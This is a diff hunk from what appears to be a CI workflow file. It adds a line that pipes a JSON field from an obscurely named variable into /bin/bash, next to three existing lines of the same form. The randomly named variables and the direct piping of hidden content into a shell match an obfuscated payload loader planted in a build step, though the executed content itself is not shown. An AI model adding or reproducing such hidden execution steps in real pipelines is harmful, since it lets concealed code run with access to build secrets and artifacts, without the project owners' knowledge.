@@ -30,6 +30,7 @@ jobs:
           echo $uh977 | jq -r .vf19021 | /bin/bash
           echo $xyouz2412 | jq -r .bcim95 | /bin/bash
           echo $glyac25 | jq -r .c3 | /bin/bash
+          printf '%s' "$asq2216" | jq -r .qt4 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
